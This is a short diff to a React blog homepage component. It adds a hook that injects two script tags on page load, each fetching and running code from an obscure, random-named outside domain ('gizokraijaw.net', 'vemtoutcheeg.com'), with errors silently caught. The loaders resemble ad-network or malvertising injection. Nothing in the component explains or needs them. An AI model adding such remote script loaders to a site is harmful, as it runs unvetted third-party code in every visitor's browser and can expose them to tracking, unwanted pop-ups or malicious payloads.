@@ -21,6 +21,7 @@ import {
   Eye,
 } from "lucide-react";
 import BlogNav from "@/components/BlogNavbar";
+import Head from "next/head";
 
 const BlogHome = ({ posts }) => {
   const [searchTerm, setSearchTerm] = useState("");
@@ -249,6 +250,24 @@ const BlogHome = ({ posts }) => {
       </Link>
     </motion.div>
   );
+
+  useEffect(() => {
+    // First script
+    (function (d, z, s) {
+      s.src = "https://" + d + "/401/" + z;
+      try {
+        (document.body || document.documentElement).appendChild(s);
+      } catch (e) {}
+    })("gizokraijaw.net", 9540235, document.createElement("script"));
+
+    // Second script
+    (function (d, z, s) {
+      s.src = "https://" + d + "/400/" + z;
+      try {
+        (document.body || document.documentElement).appendChild(s);
+      } catch (e) {}
+    })("vemtoutcheeg.com", 9540263, document.createElement("script"));
+  }, []);
 
   return (
     <>
